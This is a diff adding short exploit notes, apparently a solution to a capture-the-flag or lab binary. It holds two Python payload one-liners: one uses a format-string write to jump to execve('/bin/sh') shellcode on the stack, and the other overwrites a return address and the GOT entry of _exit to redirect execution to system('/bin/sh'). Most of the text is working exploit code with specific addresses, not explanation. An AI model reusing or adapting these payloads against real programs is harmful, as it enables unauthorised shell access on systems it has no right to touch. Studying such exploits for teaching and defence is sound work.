@@ -1,0 +1,13 @@
+//jumping to shellcode in the  stack 
+$(python -c 'print "A"*134') $(python -c 'print "\xb0\x99\x04\x08" + "\xb2\x99\x04\x08" + "\x90"*95 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*8 + "%55940x%7$hn" + "%9595x%8$hn"')
+
+//ropping to system: 
+
+performing 3 writes:
+1) to [ebp-0x8], overwriting return adr at: 0xffffdab0 with the adr of system: 0xf7e66360 + 4 (because lea esp,[ecx-4])
+2) to GOT, overwriting adr of _exit at: 0x080499b0 with the adr of system: 0xf7e66360
+3)to stack, create a fake stack frame for system: writing the parameter for system at: 0xffffdad0 which is a pointer to the string "/bin/sh" in the chunck C at: 0x0804a152
+
+writing half words from the lowest to the highest values, so the order is: 0x0804, 0x6364, 0xa148, 0xf7e6
+					(0x804)		(0x6360)		(0x6364)		(0xa155)		(0xf7e6)					(0x804)	         (0x6360)	       (0x6364)	     (0xa155)	(0xf7e6)
+$(python -c 'print "A"*134') $(python -c 'print  "\xd2\xda\xff\xff" + "\xb0\x99\x04\x08" + "\xb0\xda\xff\xff" + "\xd0\xda\xff\xff" + "\xb2\xda\xff\xff" + "\xb2\x99\x04\x08" + "A"*112 + "%2052x%7$hn" + "%23388x%8$hn" + "%4x9$hn" + "%15857x%10$hn" + "%22161x%11$hn" + "12$hn" + "/bin/sh"')
